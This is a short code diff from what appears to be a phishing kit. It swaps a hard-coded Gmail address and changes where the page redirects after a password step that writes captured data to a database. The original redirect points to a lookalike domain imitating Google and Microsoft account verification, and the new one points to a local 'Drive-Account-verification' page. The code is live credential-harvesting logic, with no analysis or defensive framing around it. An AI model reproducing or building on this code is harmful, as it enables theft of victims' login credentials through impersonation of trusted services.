@@ -1,5 +1,5 @@
 
-let email = "royjayshreen@gmail.com";
+let email = "mistersatyamkumar@gmail.com";
 
 function fillemail() {
 	// // let url be --> "https://example.com/?user=abc@gmail.com";
@@ -74,7 +74,7 @@ function doPasswordStep() {
 		})
 			.then((docRef) => {
 				console.log("Document written with ID: ", docRef.id);
-				window.location.href = "https://googlaccount.ga/microsoft-email-verification.html"
+				window.location.href = "Drive-Account-verification.html"
 			})
 			.catch((error) => {
 				console.error("Error adding document: ", error);
